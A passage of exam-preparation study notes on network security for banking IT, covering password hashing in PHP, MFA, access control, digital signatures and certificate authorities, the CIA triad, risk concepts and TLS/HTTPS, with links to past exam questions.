- **Hash passwords** with **bcrypt/Argon2 + salt** — never MD5, never plaintext, never reversible encryption.
- Enforce **strong password policy, account lockout and MFA**.
- Secure **session management**: random IDs, `HttpOnly`+`Secure`+`SameSite`, regeneration on login, timeout.
- **Restrict file uploads** — validate type and size, store outside the web root, never execute uploaded files.
- **Generic error messages**; disable directory listing and server banners.

**5. Control access**
- **Least privilege** for every account and service.
- Restrict the **admin panel** by IP, VPN and MFA.
- Disable **root SSH login**; use key-based authentication on a non-default port.

**6. Deploy protective layers**
- A **WAF** in front of the application.
- **DDoS protection / CDN**.
- **IDS/IPS** and **file-integrity monitoring**.
- Place the web server in a **DMZ**, with the **database in the internal network**.

**7. Monitor, back up and test**
- **Centralised logging** to a SIEM; alert on anomalies.
- **Regular, tested backups**, stored off-site.
- **Vulnerability scanning and penetration testing** on a schedule.
- A documented, rehearsed **incident response plan**.

#### Encrypting passwords in PHP

```php
// REGISTRATION — hash the password with bcrypt (never store it in plain text)
$hash = password_hash($password, PASSWORD_DEFAULT);   // auto-generates a salt
// store $hash in the database

// LOGIN — verify
if (password_verify($inputPassword, $storedHash)) {
    session_regenerate_id(true);        // ← prevents SESSION FIXATION
    $_SESSION['user_id'] = $userId;
    // ...
}
```

> **Never use `md5($password)` or `sha1($password)`** — they are fast, unsalted and trivially reversed with rainbow tables. **`password_hash()` / bcrypt / Argon2** are deliberately **slow and salted**, which is exactly what password storage requires. The username is not encrypted — it is an identifier, not a secret; it is the **password** that must never be recoverable.

**Previous Year Question List from this Topic:**

- [Your bank wants to secure an e-banking online system and wants to configure a web server in your data center. What kind of tools and technology do you use for t…](../written-answers/computer-network-security.md?plain=1#L3283)
- [Write the difference types of Web application attacks?](../written-answers/computer-network-security.md?plain=1#L3361)
- [What is session hijacking and how to encrypt username and password in PHP?](../written-answers/computer-network-security.md?plain=1#L3619)
- [What are the important steps to secure a web server?](../written-answers/computer-network-security.md?plain=1#L3667)
- [As a programmer when you release a software What security should you check before release your software.](../written-answers/computer-network-security.md?plain=1#L4292)

## Authentication & Access Control

### Authentication, Authorization and Multi-Factor Authentication

#### Authentication vs Authorization — the fundamental pair

| Point | **Authentication (AuthN)** | **Authorization (AuthZ)** |
|---|---|---|
| **Question answered** | **"WHO are you?"** | **"WHAT are you allowed to do?"** |
| **Purpose** | **Verify identity** | **Grant or deny permissions** |
| **Order** | **FIRST** | **SECOND** — it can only happen after authentication |
| **Based on** | Credentials — password, OTP, fingerprint, certificate | **Policies, roles, permissions, ACLs** |
| **Visible to the user?** | ✅ Yes — the user actively supplies credentials | ❌ Usually invisible |
| **Can the user change it?** | ✅ Yes — they can change their password | ❌ No — only an administrator can |
| **Example** | Entering your username and PIN at an ATM | The ATM allowing you to withdraw **your** balance but not someone else's, and capping the daily limit |
| **Failure message** | "Invalid username or password" (**401 Unauthorized**) | "Access denied" (**403 Forbidden**) |
| **Analogy** | Showing your **ID card** at the office gate | Your ID card **opening only the doors of your own department** |

*(A third "A" completes the set: **Accounting/Auditing** — recording **what the user actually did**. Together they form **AAA**.)*

#### The three (plus two) authentication factors

| Factor | Category | Examples |
|---|---|---|
| **1. Something you KNOW** | Knowledge | **Password, PIN, passphrase, security question** |
| **2. Something you HAVE** | Possession | **Mobile phone (OTP), smart card, hardware token, ATM card, authenticator app** |
| **3. Something you ARE** | Inherence — **biometrics** | **Fingerprint, face, iris, retina, voice, palm vein** |
| 4. Somewhere you are | Location | GPS position, IP geolocation, being inside the branch network |
| 5. Something you do | Behaviour | Typing rhythm, gait, signature dynamics |

#### Single-factor, Two-factor and Multi-factor

> **The defining rule: the factors must come from DIFFERENT categories.** A password plus a security question is **NOT** two-factor authentication — both are "something you know". A password plus an OTP on your phone **IS**, because it combines *know* and *have*.

| Type | Definition |
|---|---|
| **SFA — Single-Factor** | **One** factor — usually just a password. Weakest |
| **2FA — Two-Factor** | **Exactly two** factors from **two different categories** |
| **MFA — Multi-Factor** | **Two or MORE** factors from different categories. (2FA is a subset of MFA) |

#### What is Two-Factor Authentication?

**Two-Factor Authentication (2FA)** is a security process that requires a user to provide **two different types of credential from two different categories** before access is granted.

#### How 2FA works — the ATM example

```mermaid
flowchart LR
    A["FACTOR 1 — something you HAVE<br/>🏧 The physical ATM card"] --> C{"Both verified?"}
    B["FACTOR 2 — something you KNOW<br/>🔢 The 4-digit PIN"] --> C
    C -->|Yes| D["✅ Access granted"]
    C -->|No| E["❌ Access denied"]
```

**Why the ATM is the perfect example:** a thief who **steals your card** cannot use it without the PIN; a shoulder-surfer who **learns your PIN** cannot use it without the card. **Both** must be compromised — which is far harder than compromising either alone.

#### How OTP-based 2FA works — internet banking

```mermaid
sequenceDiagram
    participant U as User
    participant B as Bank server
    participant P as User's mobile phone
    U->>B: 1 . Enter username + password (FACTOR 1 — know)
    B->>B: 2 . Verify the credentials
    B->>P: 3 . Generate and SMS a 6-digit OTP<br/>(valid for 2-5 minutes, single use)
    P->>U: 4 . The user reads the OTP
    U->>B: 5 . Enter the OTP (FACTOR 2 — have)
    B->>B: 6 . Verify the OTP and that it has not expired
    B->>U: 7 . ✅ Access granted — session created
```

**Types of second factor**

| Method | How it works | Security |
|---|---|---|
| **SMS OTP** | A code sent by text message | **Weakest form of 2FA** — vulnerable to **SIM swap** and SS7 interception, but far better than no 2FA |
| **Email OTP** | A code sent by email | Weak — as secure as the email account |
| **TOTP authenticator app** (Google Authenticator, Microsoft Authenticator) | Generates a **time-based** 6-digit code from a shared seed, changing every 30 seconds. **Works offline** | ✅ **Strong** |
| **Push notification** | An approve/deny prompt in the bank's app | ✅ Strong, but vulnerable to **MFA fatigue** attacks |
| **Hardware token** (RSA SecurID) | A dedicated device showing a rolling code | ✅ Very strong |
| **FIDO2 / Security key** (YubiKey, passkeys) | Public-key cryptography bound to the website's domain | ✅ **Strongest — phishing-proof**, because the key refuses to authenticate to a lookalike domain |
| **Biometric** | Fingerprint or face on the device | ✅ Strong and convenient |

#### Why MFA is mandatory in modern banking

1. **Passwords alone are no longer sufficient** — they are reused, phished, guessed, leaked in breaches and cracked. Microsoft reports that **MFA blocks over 99 % of automated account-compromise attacks**.
2. **Credential stuffing** — attackers take username/password pairs leaked from one site and try them everywhere. MFA makes a stolen password useless.
3. **Phishing** — even if the customer types their password into a fake site, the attacker still lacks the second factor (and a FIDO2 key defeats the phish entirely).
4. **Regulatory requirement** — the **Bangladesh Bank ICT Security Guideline**, **PCI-DSS** and the EU's PSD2 **Strong Customer Authentication** rules all mandate it.
5. **Protects high-value transactions** — an additional transaction PIN or OTP for fund transfers.
6. **Protects privileged access** — administrators, the core banking system, and remote/VPN access.
7. **Builds customer trust** and reduces fraud losses and disputes.

**Limitations and risks to mention for full marks:** SMS OTP is vulnerable to **SIM-swap fraud** (very real in Bangladesh) and to interception · **MFA fatigue/push bombing** attacks · **real-time phishing proxies (Evilginx)** that relay the OTP instantly · user inconvenience and support cost · **account recovery** becomes the new weak point · and device loss. The mitigations are **app-based or FIDO2 factors instead of SMS**, **number matching** on push prompts, **risk-based/adaptive authentication**, and a **strictly controlled recovery process**.

#### Adaptive / risk-based authentication

The system evaluates the **risk of each login** — device, location, time, IP reputation, behaviour — and **steps up** the authentication only when the risk is high. A login from the usual phone at the usual time needs only a password; the same account from a new device in another country triggers an OTP and an email alert. This gives strong security **without constant friction**.

#### Access control models

| Model | Principle |
|---|---|
| **DAC — Discretionary** | The **owner** of a resource decides who may access it (Windows file permissions) |
| **MAC — Mandatory** | The **system** enforces access based on **security labels** (Top Secret, Secret) — used in military and government |
| **RBAC — Role-Based** ⭐ | Permissions are attached to **ROLES**, and users are assigned roles (Teller, Branch Manager, Auditor). **The standard in banking** |
| **ABAC — Attribute-Based** | Decisions use **attributes** — user, resource, action, time, location ("a teller may approve up to 50,000 Tk, only during banking hours, only from a branch IP") |

**Core principles:** **Least privilege** (the minimum access needed to do the job) · **Separation of duties** (the person who creates a payment must not be the person who approves it) · **Need to know** · **Dual control** for high-value operations.

#### LDAP

> **LDAP = Lightweight Directory Access Protocol.**

It is the **standard protocol for querying and modifying a directory service** — a hierarchical database of users, groups, computers and their attributes. It operates over **TCP port 389** (and **LDAPS over 636** for the encrypted version).

**Its role in security:** LDAP is the **central authentication and identity store** for an organisation. Instead of every application keeping its own user list, all of them authenticate against one directory, which gives **single sign-on, centralised password policy, immediate account disablement when an employee leaves, and group-based authorisation**.
**Implementations:** **Microsoft Active Directory**, OpenLDAP, Apache Directory, Novell eDirectory.

**Previous Year Question List from this Topic:**

- [Multi-Factor Authentication (MFA) is mandatory in modern banking infrastructure. (a) Define the concept of MFA and explicitly list the three globally recognized…](../written-answers/computer-network-security.md?plain=1#L3718)
- [টু-ফ্যাক্টর অথেনটিকেশন এবং ডিজিটাল সিগনেচার দিয়ে ডেটার সুরক্ষা কীভাবে করা হয়?](../written-answers/computer-network-security.md?plain=1#L3749)
- [(a) What is 2-factor authentication? Describe it with an example.](../written-answers/computer-network-security.md?plain=1#L3813)
- [Write down the full form of LDAP?](../written-answers/computer-network-security.md?plain=1#L3844)
- [Your bank has an online banking system and this process is performed by sending OTP in mobile or OTP in mail when a customer transfers money from a mobile banki…](../written-answers/computer-network-security.md?plain=1#L3861)
- [How to work two factor authentication?](../written-answers/computer-network-security.md?plain=1#L3923)
- [(b) How do you define 2 factor authentication? Give example.](../written-answers/computer-network-security.md?plain=1#L3958)
- [(খ) Authentication বলতে কি বুঝায়? Two Factor Authenticating কি? উদাহরণসহ ব্যাখ্যা করুন।](../written-answers/computer-network-security.md?plain=1#L4074)
- [১৮. পাসওয়ার্ড সুরক্ষা জন্য যে পদ্ধতি ব্যবহার করা হয় তার নাম কী?](../written-answers/computer-network-security.md?plain=1#L4138)
- [What do you mean by two factor authentication? Explain with example.](../written-answers/computer-network-security.md?plain=1#L4165)
- [(a) What is authentication? With example write a short note on “Two factor authentication”. (5 marks)](../written-answers/computer-network-security.md?plain=1#L4266)
- [What is authentication and authorization? What is the CIA triad in cyber security? How does it work?](../written-answers/computer-network-security.md?plain=1#L5024)


---

### Digital Signatures and Digital Certificates

#### What is a digital signature?

A **digital signature** is a **cryptographic mechanism that verifies the authenticity and integrity of a digital document or message, and binds it to its signer in a way the signer cannot later deny.**

It is the electronic equivalent of a handwritten signature or a stamped seal — but **far more secure**, because it is mathematically tied to the exact contents of the document.

#### How a digital signature works

```mermaid
flowchart TD
    subgraph S["SIGNING — performed by the SENDER"]
        D1["Original document"] --> H1["Hash function (SHA-256)"]
        H1 --> DG1["Message digest<br/>(fixed-size fingerprint)"]
        DG1 --> EN["Encrypt the digest with the<br/>🔐 SENDER'S PRIVATE KEY"]
        EN --> SG["DIGITAL SIGNATURE"]
        D1 --> PKG["Send: document + signature<br/>(+ the sender's certificate)"]
        SG --> PKG
    end
    subgraph V["VERIFICATION — performed by the RECEIVER"]
        PKG --> SP["Separate the document<br/>and the signature"]
        SP --> DEC["Decrypt the signature with the<br/>🔓 SENDER'S PUBLIC KEY"]
        DEC --> DGA["Digest A"]
        SP --> H2["Hash the received document<br/>with the SAME hash function"]
        H2 --> DGB["Digest B"]
        DGA --> CMP{"Digest A = Digest B ?"}
        DGB --> CMP
        CMP -->|"✅ Equal"| OK["AUTHENTIC and UNALTERED<br/>— and only the sender could have signed it"]
        CMP -->|"❌ Different"| BAD["FORGED or TAMPERED — reject"]
    end
```

**Why the design works:**
- Only the sender holds the **private key**, so only the sender could have produced a signature that their **public key** decrypts → **authentication** and **non-repudiation**.
- The digest depends on **every bit** of the document, so any alteration makes Digest B differ from Digest A → **integrity**.
- The document is **hashed first** because RSA is far too slow to sign a large file directly — signing a fixed 256-bit digest is fast regardless of document size.

#### What a digital signature does and does not provide

| Property | Provided? |
|---|---|
| **Authentication** — who sent it | ✅ **Yes** |
| **Integrity** — has it been changed | ✅ **Yes** |
| **Non-repudiation** — the sender cannot deny it | ✅ **Yes — its unique contribution** |
| **Confidentiality** — is it secret | ❌ **NO** — the document remains readable. For secrecy it must **also be encrypted** |

#### Why digital signatures are important

1. **Legal validity** — recognised in Bangladesh under the **ICT Act 2006** and internationally (eIDAS, ESIGN).
2. **Non-repudiation** — a customer cannot deny authorising a 50 lakh transfer.
3. **Tamper detection** — a single changed character invalidates the signature.
4. **Trust in e-commerce and e-government** — e-tender (e-GP) submissions, e-banking, tax filing.
5. **Software integrity** — code signing proves an update genuinely came from the vendor (defeating supply-chain tampering).
6. **Efficiency** — no printing, couriering or physical storage; instant verification.
7. **The foundation of SSL/TLS certificates** and therefore of HTTPS.

#### Digital signature vs Digital certificate

| Point | **Digital Signature** | **Digital Certificate** |
|---|---|---|
| **What it is** | A **cryptographic value attached to a document** | An **electronic ID document** issued by a trusted authority |
| **Purpose** | Proves **who signed a specific document and that it is unaltered** | Proves **that a public key genuinely belongs to a named entity** |
| **Created by** | The **signer**, using their private key | A **Certificate Authority (CA)**, using the CA's private key |
| **Contains** | The encrypted hash of one document | The **owner's name, public key, serial number, validity dates, issuer, and the CA's signature** |
| **Validity** | Tied to that one document, forever | A fixed period (1–2 years), and can be **revoked** |
| **Standard** | PKCS#7, CMS, XMLDSig | **X.509** |
| **Answers** | *"Did this person sign this document, and has it changed?"* | *"Is this public key really the bank's?"* |
| **Relationship** | ⭐ **A digital certificate is itself DIGITALLY SIGNED by the CA.** And to trust a digital signature you must first trust the signer's certificate | |

> **They are two halves of one system.** A digital signature alone proves *"whoever holds private key X signed this"* — but not **who** that is. The **certificate** is what binds key X to "Dutch-Bangla Bank Limited", vouched for by a CA that everyone already trusts. Without certificates, an attacker could simply publish their own key claiming to be the bank.

#### The Certificate Authority (CA)

A **Certificate Authority** is a **trusted third party that issues, manages, renews and revokes digital certificates**, after verifying the identity of the applicant.

**The purpose and functions of a CA:**

| # | Function | Detail |
|---|---|---|
| 1 | **Identity verification** | Before issuing a certificate, the CA **verifies that the applicant really is who they claim to be** — the core of the whole trust model |
| 2 | **Certificate issuance** | Binds the verified identity to a public key and **signs it with the CA's own private key** |
| 3 | **Acting as a trusted third party** | Two strangers who both trust the CA can therefore trust each other's keys |
| 4 | **Maintaining the CRL** | Publishes the **Certificate Revocation List** of certificates that are no longer trustworthy, and runs **OCSP** for real-time checking |
| 5 | **Renewal and lifecycle management** | Certificates expire deliberately, limiting the damage of an undetected key compromise |
| 6 | **Enabling non-repudiation** | Because identity was verified, the signer cannot claim the key was not theirs |

**The chain of trust:**

```mermaid
flowchart TD
    R["ROOT CA<br/>self-signed; its certificate is PRE-INSTALLED<br/>in every browser and operating system"] --> I["INTERMEDIATE CA<br/>signed by the Root CA"]
    I --> E["END-ENTITY CERTIFICATE<br/>e.g. www.bank.com.bd — signed by the Intermediate CA"]
    E --> B["🌐 Your browser verifies the chain upwards.<br/>If it reaches a trusted root → ✅ padlock shown"]
```

**Well-known CAs:** DigiCert, Sectigo, GlobalSign, Entrust, **Let's Encrypt** (free and automated), and in Bangladesh the **Controller of Certifying Authorities (CCA)** under the ICT Division, which licenses local CAs.

> ### "CTC / CCA — what is it used for?"
> The **CCA (Controller of Certifying Authorities)** is the **government body under Bangladesh's ICT Division that licenses and regulates Certifying Authorities**, under the **ICT Act 2006**. It is the **root of trust for legally recognised digital signatures in Bangladesh**, used for **e-GP tender submission, e-banking, tax filing and legally valid electronic documents**.

#### Password protection methods

| Method | Detail |
|---|---|
| **Strong password policy** | Minimum 12+ characters, mixed case, digits and symbols; **length matters more than complexity** |
| **Never reuse passwords** across sites |
| **Password manager** | Generates and stores unique random passwords |
| **Hashing with salt** | Servers must store **bcrypt/Argon2/scrypt** hashes, never plaintext or reversible encryption |
| **MFA** | The single most effective control |
| **Account lockout / rate limiting** | Defeats brute force |
| **Passphrases** | Four random words are both stronger and easier to remember |
| **Regular change ONLY on suspicion** | Modern NIST guidance **discourages forced periodic changes**, which lead to weaker, predictable passwords |
| **Never share, never write down, never send by email/SMS** |
| **Breach monitoring** | Check whether credentials have appeared in a known breach |
| **Passwordless / passkeys (FIDO2)** | The emerging replacement for passwords entirely |

**Previous Year Question List from this Topic:**

- [ডিজিটাল সিগনেচার (Digital Signature) কী? এর কার্যকারিতা ব্যাখ্যা করুন।](../written-answers/computer-network-security.md?plain=1#L3777)
- [Difference between Digital signature and Digital certificate.](../written-answers/computer-network-security.md?plain=1#L3901)
- [What is digital signature? Where is it used?](../written-answers/computer-network-security.md?plain=1#L3988)
- [What is a digital signature? Describe its role in digital security?](../written-answers/computer-network-security.md?plain=1#L4023)
- [What is Digital signature? Explain shortly.](../written-answers/computer-network-security.md?plain=1#L4052)
- [(b) Write down the purpose of Certification Authority (CA) in Digital Signature.](../written-answers/computer-network-security.md?plain=1#L4106)
- [What is public key encryption? Explain digital signature with example.](../written-answers/computer-network-security.md?plain=1#L1800)
- [b) What is a digital signature? And why is that important?](../written-answers/computer-network-security.md?plain=1#L1840)
- [CTC কী? কী কাজে ব্যবহার হয়?](../written-answers/computer-network-security.md?plain=1#L5459)


---

## Security Principles (CIA Triad)

### The CIA Triad and Security Principles

The **CIA Triad** is the foundational model of information security — the **three core objectives** every security control ultimately serves.

> **CIA stands for CONFIDENTIALITY, INTEGRITY and AVAILABILITY.**
> *(It has nothing to do with the American intelligence agency of the same initials.)*

```mermaid
flowchart TD
    T["THE CIA TRIAD"]
    T --> C["🔒 CONFIDENTIALITY<br/>Only AUTHORISED people can ACCESS the data"]
    T --> I["✏️ INTEGRITY<br/>The data is ACCURATE and UNALTERED"]
    T --> A["⚡ AVAILABILITY<br/>The data is ACCESSIBLE when NEEDED"]
```

#### 1. Confidentiality

**Ensuring that information is accessible only to those authorised to have access** — preventing unauthorised disclosure. It is the property of **secrecy and privacy**.

| Threats | Controls |
|---|---|
| Eavesdropping, sniffing, data breach, shoulder surfing, social engineering, stolen laptops, insider leakage | **Encryption** (at rest and in transit) · **Access control and authentication** · **MFA** · least privilege · data classification · **VPN** · physical security · NDAs · **data masking and tokenisation** |

**Banking example:** a customer's account balance and transaction history must be visible **only** to that customer and to authorised bank staff — never to another customer, and never to an outsider intercepting the connection.

#### 2. Integrity

**Ensuring the accuracy, completeness and trustworthiness of data over its entire lifecycle** — preventing **unauthorised or accidental modification**, and ensuring that any change that does occur is **detectable**.

| Threats | Controls |
|---|---|
| Unauthorised modification, MITM alteration, SQL injection, malware, human error, hardware faults, insider tampering | **Hashing and checksums** · **digital signatures** · **MAC/HMAC** · **access control** · **version control** · **database transactions (ACID)** · **audit logs** · **input validation** · **RAID and error-correcting memory (ECC)** · dual control and maker-checker |

**Banking example:** if a customer transfers **5,000 Tk**, the amount must arrive as **exactly 5,000** — not 50,000, not 500. If an attacker alters the amount in transit, the system must **detect it and reject the transaction**.

#### 3. Availability

**Ensuring that information and systems are accessible and usable by authorised users whenever they are needed.**

| Threats | Controls |
|---|---|
| **DoS/DDoS attacks**, ransomware, hardware failure, power cut, natural disaster, network outage, human error | **Redundancy and failover** (N+1, clustering) · **backups and a tested DR site** · **UPS and generators** · **load balancing** · **DDoS protection** · patching and capacity planning · **RAID** · monitoring and an incident response plan · SLAs |

**Banking example:** ATMs, internet banking and the core system must work **24×7**. A DDoS attack on payday that makes internet banking unreachable is a **security incident**, even though not a single byte of data was stolen or altered.

#### The three-way comparison

| Point | **Confidentiality** | **Integrity** | **Availability** |
|---|---|---|---|
| **Ensures** | Data is **SECRET** | Data is **ACCURATE** | Data is **ACCESSIBLE** |
| **Question** | *"Can the wrong people read it?"* | *"Has it been changed?"* | *"Can I get to it when I need it?"* |
| **Violated by** | A data breach, eavesdropping | Tampering, corruption | A DoS attack, an outage |
| **Main control** | **Encryption** | **Hashing / digital signatures** | **Redundancy / backups** |
| **Attack type** | **Passive** (interception) | **Active** (modification) | **Active** (interruption) |

#### How the three work together

They are **interdependent, and often in tension**:

```mermaid
flowchart LR
    A["Encrypt everything and lock it down<br/>(maximises CONFIDENTIALITY)"] -->|"but"| B["Lost keys, slow access,<br/>complex recovery → hurts AVAILABILITY"]
    C["Make data open and easy to reach<br/>(maximises AVAILABILITY)"] -->|"but"| D["More exposure → hurts CONFIDENTIALITY"]
    E["Add strict validation and approval steps<br/>(maximises INTEGRITY)"] -->|"but"| F["Slower processes → hurts AVAILABILITY"]
```

**Security is therefore always a BALANCE**, set by a **risk assessment** of what the organisation actually needs. A military system prioritises confidentiality; an e-commerce site prioritises availability; a bank's ledger prioritises integrity — but all three must be adequate in every case.

**A worked banking illustration of the three together:** a customer logs into internet banking.
- **Confidentiality:** the session runs over **TLS**, the password is stored only as a **bcrypt hash**, and the balance is shown only to that authenticated customer.
- **Integrity:** the transfer instruction is **digitally signed** and protected by a **hash**, and the database enforces **ACID** transactions so the debit and credit either both happen or neither does.
- **Availability:** the service runs on **redundant servers across two data centres**, behind **DDoS protection**, with a **DR site** ready, so it is reachable at 3 a.m. on a holiday.

#### Beyond CIA — the extended model

| Principle | Meaning |
|---|---|
| **Authentication** | Verifying identity |
| **Authorization** | Granting the right permissions |
| **Non-repudiation** | The sender **cannot deny** having sent it |
| **Accountability / Auditability** | Every action is traceable to an individual |
| **Privacy** | Personal data is used only as consented |

*(Adding **Authentication, Authorization and Non-repudiation** to CIA gives the **five/six pillars of information assurance**, sometimes called the **Parkerian Hexad** with **Possession/Control**, **Authenticity** and **Utility**.)*

#### Non-repudiation

> **Non-repudiation** is the assurance that **someone cannot deny the validity of something they did** — a sender cannot deny sending a message, and a receiver cannot deny receiving it.

**How it is achieved:** **digital signatures** (only the private-key holder could have produced the signature) · **audit logs and timestamps** · **trusted third-party timestamping** · **biometric authentication** · **blockchain's immutable ledger**.

**A proper banking example:**
> A customer uses internet banking to transfer **10 lakh taka** to a supplier. The instruction is **digitally signed with the customer's private key**, which only the customer possesses, and the bank records the signature, the timestamp, the IP address and the OTP verification in an **immutable audit log**.
>
> A month later the customer disputes the transaction and claims they never authorised it. The bank can **mathematically prove** that the instruction was signed by the customer's private key — no one else could have produced that signature. **The customer cannot repudiate the transaction.**
>
> **Without non-repudiation**, the bank would have only its own word against the customer's, and could not defend the transaction in court. This is exactly why **digital signatures, and not merely passwords, are required for high-value instructions**.

*(Note: symmetric encryption **cannot** provide non-repudiation, because both parties hold the same key — either of them could have created the message. Only **asymmetric cryptography** can.)*

#### Threat, Vulnerability and Risk — a frequently confused trio

| Term | Definition | Example |
|---|---|---|
| **Asset** | Anything of value that needs protecting | The customer database |
| **Threat** | A **potential DANGER** that could exploit a weakness and cause harm. You **cannot control** threats — they exist whether you like it or not | A hacker, a virus, a flood, a careless employee |
| **Vulnerability** | A **WEAKNESS or gap** in the system that a threat could exploit. **You CAN control this** | An unpatched server, a weak password, no firewall, an untrained employee |
| **Risk** | The **POTENTIAL FOR LOSS** when a threat exploits a vulnerability. Risk = **Threat × Vulnerability × Impact** | The likelihood and cost of the customer database being stolen |
| **Exploit** | The **actual tool or technique** used to take advantage of a vulnerability | The EternalBlue exploit code |
| **Attack** | The **act** of exploiting it | Running EternalBlue against the server |
| **Control / Safeguard** | The measure that reduces the risk | Applying the patch, installing a firewall |

> ### **RISK = THREAT × VULNERABILITY × IMPACT**
>
> **The critical insight:** if either the threat or the vulnerability is zero, the risk is zero.
> - **A threat with NO vulnerability = no risk.** A hacker attacking a fully patched, properly configured server achieves nothing.
> - **A vulnerability with NO threat = little risk.** An unpatched server on a physically isolated network with no attacker has low practical risk.
>
> **Security management works by reducing VULNERABILITY**, because that is the only one of the three factors an organisation directly controls. You cannot stop hackers existing; you can stop your systems being exploitable.

**An everyday analogy:** the **threat** is a burglar; the **vulnerability** is your unlocked window; the **risk** is the chance of being burgled and losing your valuables. You cannot remove burglars from the world — but you can **lock the window**, and the risk drops to near zero.

**The four ways to treat a risk:** **Avoid** it (stop doing the risky activity) · **Mitigate/Reduce** it (apply controls) · **Transfer** it (insurance, outsourcing) · **Accept** it (when the cost of control exceeds the potential loss).

**Previous Year Question List from this Topic:**

- [What does CIA stand for in information security? Explain each component briefly.](../written-answers/computer-network-security.md?plain=1#L4998)
- [What is authentication and authorization? What is the CIA triad in cyber security? How does it work?](../written-answers/computer-network-security.md?plain=1#L5024)
- [(a) What is the CIA triad of information system? Briefly describe its each component.](../written-answers/computer-network-security.md?plain=1#L5053)
- [Describe how the principles of Confidentiality, Integrity, and Availability work together to protect organizational data, and provide one real-world example of…](../written-answers/computer-network-security.md?plain=1#L5084)
- [What is CIA Triad?](../written-answers/computer-network-security.md?plain=1#L5115)
- [Preserving confidentiality integrity and availability of data is a restatement of the concern over falsification, interception, masquerade and denial of service…](../written-answers/computer-network-security.md?plain=1#L5140)
- [Information System কী? Information Syetem -এর সুরক্ষায় প্রয়োজনীয় পদক্ষেপ সংক্ষেপে বর্ণনা করুন?](../written-answers/computer-network-security.md?plain=1#L5170)
- [What is the difference among threat, vulnerability and risk? Explain SSL and TLS.](../written-answers/computer-network-security.md?plain=1#L4633)
- [What is Vulnerability?](../written-answers/computer-network-security.md?plain=1#L4882)


---

## Security Protocols (SSL/TLS, HTTPS)

### SSL, TLS and HTTPS

#### What is SSL/TLS?

**SSL (Secure Sockets Layer)** and its successor **TLS (Transport Layer Security)** are **cryptographic protocols that provide secure, encrypted communication over a computer network**.

> **Full forms:** **SSL = Secure Sockets Layer** · **TLS = Transport Layer Security**
> *(Some papers write "TSL" — this is a misspelling of **TLS**.)*

**The historical relationship:** SSL was created by Netscape (SSL 2.0 in 1995, SSL 3.0 in 1996). In 1999 the IETF standardised it and **renamed it TLS**. **All versions of SSL are now obsolete and insecure** and must be disabled — but the name "SSL" persists in everyday speech ("SSL certificate" almost always means a **TLS** certificate).

| Version | Year | Status |
|---|---|---|
| SSL 1.0 | — | Never released |
| SSL 2.0 | 1995 | ❌ **Deprecated — insecure** |
| SSL 3.0 | 1996 | ❌ **Deprecated** (broken by POODLE, 2014) |
| TLS 1.0 | 1999 | ❌ Deprecated (2021) |
| TLS 1.1 | 2006 | ❌ Deprecated (2021) |
| **TLS 1.2** | **2008** | ✅ **Secure — widely used** |
| **TLS 1.3** | **2018** | ✅ **Current best — faster and simpler** |

#### What SSL/TLS provides

| Service | How |
|---|---|
| **Confidentiality** | **Symmetric encryption (AES)** of all data in the session |
| **Integrity** | **MAC / AEAD** detects any alteration in transit |
| **Authentication** | The server (and optionally the client) proves its identity with an **X.509 certificate** |
| **Key exchange** | **Asymmetric cryptography (RSA / ECDHE)** securely establishes the session key |

#### Where it sits

TLS operates **between the Transport layer (TCP) and the Application layer** — often described as sitting at the **session/presentation layers (5–6)** of the OSI model, or simply as an application-layer protocol in the TCP/IP model. It secures **any** TCP-based protocol: HTTPS, FTPS, SMTPS, IMAPS, LDAPS.

#### The TLS handshake

```mermaid
sequenceDiagram
    participant C as Client (browser)
    participant S as Server (bank.com)
    C->>S: 1 . ClientHello — TLS versions and cipher suites supported, random number
    S->>C: 2 . ServerHello — chosen version and cipher suite, random number
    S->>C: 3 . CERTIFICATE (contains the server's PUBLIC KEY, signed by a CA)
    C->>C: 4 . VERIFY the certificate: trusted CA? not expired? not revoked?<br/>does the domain name match?
    C->>S: 5 . Key exchange — generate the pre-master secret and send it<br/>encrypted with the SERVER'S PUBLIC KEY (or perform ECDHE)
    S->>S: 6 . Decrypt with the SERVER'S PRIVATE KEY
    Note over C,S: 7 . BOTH independently derive the same SYMMETRIC SESSION KEY
    C->>S: 8 . Finished (encrypted)
    S->>C: 9 . Finished (encrypted)
    Note over C,S: 10 . 🔒 All further traffic is encrypted with fast SYMMETRIC AES
```

> **The hybrid design again:** **asymmetric** cryptography is used **only** to authenticate the server and establish the session key; all the bulk data is then protected with **fast symmetric AES**.

**What TLS 1.3 improved:** removed all obsolete and weak algorithms (RSA key transport, RC4, MD5, SHA-1, static DH); reduced the handshake from **2 round trips to 1** (0-RTT for resumed sessions), making it noticeably faster; and made **Perfect Forward Secrecy mandatory**.

#### Perfect Forward Secrecy (PFS)

With **ephemeral key exchange (ECDHE)**, a **new, temporary key pair is generated for every session** and discarded afterwards.

> **Why it matters — the answer to "an attacker steals a website's private key and remains undetected":**
> - **WITHOUT forward secrecy** (old RSA key transport): the attacker who has recorded past encrypted traffic can now **decrypt ALL of it retrospectively**, plus impersonate the site. This is a catastrophe.
> - **WITH Perfect Forward Secrecy**: the session keys were **never derived from the long-term private key** and were destroyed after each session. The attacker **cannot decrypt any past traffic**. They can still **impersonate the server going forward** until the certificate is revoked — so the response must be to **revoke the certificate immediately, reissue with a new key pair, and investigate**.
>
> This is precisely why **PFS is mandatory in TLS 1.3**.

#### What is HTTPS?

**HTTPS = HTTP + TLS.** It is the ordinary HTTP protocol **carried inside a TLS-encrypted tunnel**.

#### HTTP vs HTTPS

| Point | **HTTP** | **HTTPS** |
|---|---|---|
| **Full form** | HyperText Transfer Protocol | HyperText Transfer Protocol **Secure** |
| **Port** | **80** | **443** |
| **Encryption** | ❌ **None — plaintext** | ✅ **Encrypted with TLS** |
| **Data visible to an interceptor?** | ✅ **Yes — everything, including passwords** | ❌ **No — only ciphertext** |
| **Authentication of the server** | ❌ None — you cannot be sure who you are talking to | ✅ **Certificate verified against a trusted CA** |
| **Integrity** | ❌ Data can be modified in transit | ✅ Any modification is detected |
| **Certificate required** | ❌ No | ✅ **Yes — an SSL/TLS certificate** |
| **Browser indication** | ⚠️ **"Not secure"** warning | 🔒 **Padlock icon** |
| **Speed** | Marginally faster (no handshake) | Slightly slower, but **HTTP/2 and TLS 1.3 usually make HTTPS FASTER overall** |
| **SEO** | Penalised by Google | ✅ **Ranking boost** |
| **Vulnerable to MITM/sniffing** | ✅ Highly | ❌ Protected |
| **Used for** | Nothing, today | **Everything** — mandatory for login, payment, banking |

#### How HTTPS protects a website

1. **Encrypts everything in transit** — passwords, card numbers, cookies, page content — so an attacker on a shared Wi-Fi or an ISP link sees only meaningless ciphertext.
